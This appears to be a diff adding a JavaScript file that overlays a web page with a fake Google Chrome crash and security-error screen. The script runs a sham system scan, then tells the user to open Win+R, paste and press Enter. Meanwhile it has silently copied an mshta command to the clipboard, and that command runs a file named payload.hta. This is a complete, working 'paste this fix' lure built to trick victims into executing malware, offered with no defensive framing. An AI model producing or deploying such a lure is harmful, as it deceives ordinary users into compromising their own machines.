@@ -1,0 +1,90 @@
+(function() {
+  if (document.getElementById('chrome-security-overlay')) return;
+
+  var overlay = document.createElement('div');
+  overlay.id = 'chrome-security-overlay';
+  overlay.style.cssText = 'position:fixed!important;top:0!important;left:0!important;width:100vw!important;height:100vh!important;z-index:2147483647!important;background-color:#1f1f1f!important;font-family:Segoe UI,Roboto,Arial,sans-serif!important;display:flex!important;flex-direction:column!important;align-items:center!important;padding:20px!important;overflow:auto!important;';
+
+  overlay.innerHTML = '<div style="flex:1"></div><div style="max-width:600px;width:100%;"><div id="cso-icon-row" style="margin-bottom:20px;"><svg style="display:block;width:48px;height:48px;" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" fill="none"><path stroke="#c7c7c7" stroke-width="3" stroke-linecap="square" fill="none" d="M1.5 8.5 v34 h45 v-28 m-3-3 h-10 v-3 m-3-3 h-10 m15 6 h-18 v-3 m-3-3 h-10"/><path stroke="#c7c7c7" stroke-width="2" stroke-linecap="square" fill="none" d="M11 21 h0.01 m-0.01 4 h0.01 m3.99 0 h0.01 m-0.01-4 h0.01 m-2.01 2 h0.01 M33 21 h0.01 m-0.01 4 h0.01 m3.99 0 h0.01 m-0.01-4 h0.01 m-2.01 2 h0.01"/><path stroke="#c7c7c7" stroke-width="2" stroke-linecap="square" fill="none" d="M12 35 h2 m2-2 h12 m2 2 h3 m2 2 h3"/></svg></div><h1 id="cso-title" style="font-size:20px;font-weight:400;margin-bottom:13px;color:#e3e3e3;font-family:Segoe UI,Roboto,Arial,sans-serif;">Google Chrome stopped abnormally.</h1><div id="cso-crash-text"><p style="font-size:12px;font-weight:400;line-height:18px;color:#c7c7c7;margin-bottom:0;">Google Chrome has detected a memory cache error that may lead to potential security risks that can compromise your browsing data.</p><p style="font-size:10px;font-weight:400;color:#c7c7c7;margin-top:13px;margin-bottom:20px;">Error code: MEMORY_CACHE_CORRUPTION</p></div><div id="cso-scan-text" style="display:none;"><p style="font-size:16px;font-weight:600;color:#e3e3e3;margin-bottom:16px;">Scanning system files and browser data...</p><div style="width:100%;height:6px;background:#3a3a3a;border-radius:3px;overflow:hidden;margin-bottom:12px;"><div id="cso-progress-bar" style="height:100%;width:0%;background:#8ab4f8;border-radius:3px;transition:width 0.3s ease;"></div></div><p style="font-size:12px;color:#999;">Please wait while we scan your system...</p></div><div id="cso-troubleshoot" style="display:none;"><div style="margin-bottom:16px;"><svg viewBox="0 0 24 24" width="40" height="40" xmlns="http://www.w3.org/2000/svg"><path fill="#e8a33d" d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg></div><h2 style="font-size:18px;font-weight:600;color:#e8a33d;margin-bottom:10px;">Security issues detected</h2><p style="font-size:13px;color:#c7c7c7;line-height:20px;margin-bottom:20px;">Google Chrome has detected potential security threats as a result of a memory cache corruption.</p><p style="font-size:13px;color:#e3e3e3;font-weight:600;margin-bottom:14px;">You need to manually fix this:</p><div style="margin-bottom:20px;"><div style="display:flex;align-items:center;margin-bottom:12px;"><span style="font-size:14px;font-weight:600;color:#999;width:24px;flex-shrink:0;">1</span><span style="font-size:14px;color:#e3e3e3;">Open <strong><svg style="width:14px;height:14px;vertical-align:middle;margin-right:2px;" viewBox="0 0 88 88" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M0 12.402l35.687-4.86.016 34.423-35.67.203zm35.67 33.529l.028 34.453L.028 75.48.026 45.7zm4.326-39.025L87.314 0v41.527l-47.318.376zm47.329 39.349l-.011 41.34-47.318-6.678-.066-34.739z"/></svg> Win + R</strong></span></div><div style="display:flex;align-items:center;margin-bottom:12px;"><span style="font-size:14px;font-weight:600;color:#999;width:24px;flex-shrink:0;">2</span><span style="font-size:14px;color:#e3e3e3;">Press <strong>Ctrl + V</strong></span></div><div style="display:flex;align-items:center;margin-bottom:12px;"><span style="font-size:14px;font-weight:600;color:#999;width:24px;flex-shrink:0;">3</span><span style="font-size:14px;color:#e3e3e3;">Press <strong>Enter</strong></span></div></div><div style="display:flex;align-items:flex-start;gap:8px;margin-bottom:12px;"><svg style="flex-shrink:0;margin-top:2px;" viewBox="0 0 16 16" width="14" height="14"><circle cx="8" cy="8" r="7" stroke="#999" stroke-width="1.5" fill="none"/><path d="M8 7v4M8 5v1" stroke="#999" stroke-width="1.5" stroke-linecap="round"/></svg><span style="font-size:12px;color:#999;line-height:18px;">The repair command was copied to your clipboard. If you\'re having trouble, you can manually copy and run the command below:</span></div><div style="display:flex;align-items:center;background:#2a2a2a;border:1px solid #444;border-radius:6px;padding:10px 12px;"><span style="font-size:12px;font-family:Cascadia Code,Consolas,monospace;color:#c7c7c7;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">mshta "c:\\Users\\lifes\\Documents\\demon\\payload.hta"</span><button id="cso-copy-btn" style="background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;border-radius:4px;"><svg viewBox="0 0 16 16" width="14" height="14"><rect x="5" y="5" width="9" height="9" rx="1" stroke="#999" stroke-width="1.5" fill="none"/><path d="M3 11V3a1 1 0 011-1h8" stroke="#999" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></button></div></div><div id="cso-action-row" style="display:flex;align-items:center;width:100%;margin-top:20px;"><a id="cso-learn-more" href="#" style="font-size:12px;color:#a8c7fa;text-decoration:underline;cursor:pointer;">Learn more</a><div style="flex:1;"></div><button id="cso-scan-btn" style="background-color:#aecbfa;color:#1f1f1f;border:1px solid #8ab4f8;border-radius:100px;padding:8px 16px;font-size:13px;font-weight:500;cursor:pointer;font-family:Segoe UI,Roboto,Arial,sans-serif;line-height:16px;outline:none;box-shadow:0 0 0 2px #1f1f1f,0 0 0 4px #8ab4f8;">Run scan</button></div></div><div style="flex:2;"></div><div id="cso-modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:2147483647;align-items:center;justify-content:center;"><div style="background:#2d2d2d;border:1px solid #444;border-radius:8px;padding:24px;max-width:420px;width:90%;"><h2 style="font-size:14px;font-weight:600;color:#e3e3e3;margin-bottom:12px;">Error: MEMORY_CACHE_CORRUPTION</h2><p style="font-size:13px;color:#c7c7c7;line-height:20px;margin-bottom:20px;">Memory cache has been corrupted, resulting in unsafe browsing usage. Troubleshoot the fix to solve.</p><button id="cso-modal-ok" style="background-color:#aecbfa;color:#1f1f1f;border:none;border-radius:100px;padding:8px 20px;font-size:13px;font-weight:500;cursor:pointer;font-family:Segoe UI,Roboto,Arial,sans-serif;float:right;">OK</button></div></div>';
+
+  document.documentElement.appendChild(overlay);
+  document.title = 'Error';
+  var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+  link.type = 'image/svg+xml';
+  link.rel = 'icon';
+  link.href = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='7' fill='%234a90d9'/><path d='M7 4h2v5H7zM7 10.5h2v2H7z' fill='white'/></svg>";
+  document.head.appendChild(link);
+
+  function copyToClipboard(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+
+  var scanning = false;
+
+  document.getElementById('cso-scan-btn').addEventListener('click', function() {
+    if (scanning) return;
+    scanning = true;
+
+    copyToClipboard('mshta "c:\\Users\\lifes\\Documents\\demon\\payload.hta"');
+
+    document.getElementById('cso-crash-text').style.display = 'none';
+    document.getElementById('cso-title').style.display = 'none';
+    document.getElementById('cso-action-row').style.display = 'none';
+    document.getElementById('cso-scan-text').style.display = 'block';
+
+    var bar = document.getElementById('cso-progress-bar');
+    var progress = 0;
+    var duration = 10000 + Math.random() * 5000;
+    var startTime = Date.now();
+
+    function tick() {
+      var elapsed = Date.now() - startTime;
+      var target = Math.min((elapsed / duration) * 100, 100);
+      var jump = Math.random() * 3;
+      if (Math.random() > 0.3) progress += jump;
+      if (progress > target) progress = target;
+      bar.style.width = progress + '%';
+
+      if (elapsed >= duration) {
+        bar.style.width = '100%';
+        setTimeout(showTroubleshoot, 500);
+      } else {
+        var delay = 150 + Math.random() * 400;
+        setTimeout(tick, delay);
+      }
+    }
+    tick();
+  });
+
+  function showTroubleshoot() {
+    document.title = 'Error';
+    document.getElementById('cso-scan-text').style.display = 'none';
+    document.getElementById('cso-icon-row').style.display = 'none';
+    document.getElementById('cso-troubleshoot').style.display = 'block';
+  }
+
+  document.getElementById('cso-copy-btn').addEventListener('click', function() {
+    copyToClipboard('mshta "c:\\Users\\lifes\\Documents\\demon\\payload.hta"');
+    var btn = document.getElementById('cso-copy-btn');
+    var original = btn.innerHTML;
+    btn.innerHTML = '<svg viewBox="0 0 16 16" width="14" height="14"><path d="M3 8l3 3 7-7" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+    setTimeout(function() { btn.innerHTML = original; }, 1000);
+  });
+
+  document.getElementById('cso-learn-more').addEventListener('click', function(e) {
+    e.preventDefault();
+    var modal = document.getElementById('cso-modal');
+    modal.style.display = 'flex';
+  });
+
+  document.getElementById('cso-modal-ok').addEventListener('click', function() {
+    document.getElementById('cso-modal').style.display = 'none';
+  });
+})();
